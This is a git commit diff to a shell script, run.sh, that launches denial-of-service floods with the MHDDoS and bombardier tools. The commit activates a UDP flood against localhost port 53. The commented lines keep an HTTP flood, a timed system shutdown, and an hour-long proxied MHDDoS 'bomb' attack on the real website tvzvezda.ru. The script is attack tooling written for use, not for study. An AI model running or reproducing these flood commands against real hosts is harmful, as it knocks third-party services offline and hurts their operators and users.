f631abc896a8efbbc9568dfc1fe36333305093d2
terkozak <101092357+terkozak@users.noreply.github.com>
2022-03-08 08:54:57 -0500

    Update run.sh

--- run.sh
+++ run.sh
@@ -1,6 +1,6 @@
 #!/bin/sh
 
-#python3 /home/ubuntu/mhddos/start.py udp 127.0.0.1:53 1 60 &
+python3 /home/ubuntu/mhddos/start.py udp 127.0.0.1:53 1 60 &
 #bombardier -c 1 -d 60s http://localhost &
 #sudo shutdown -P +2 &
 #python3 /home/ubuntu/mhddos/start.py bomb tvzvezda.ru 5 999 proxy5.txt 144 3600
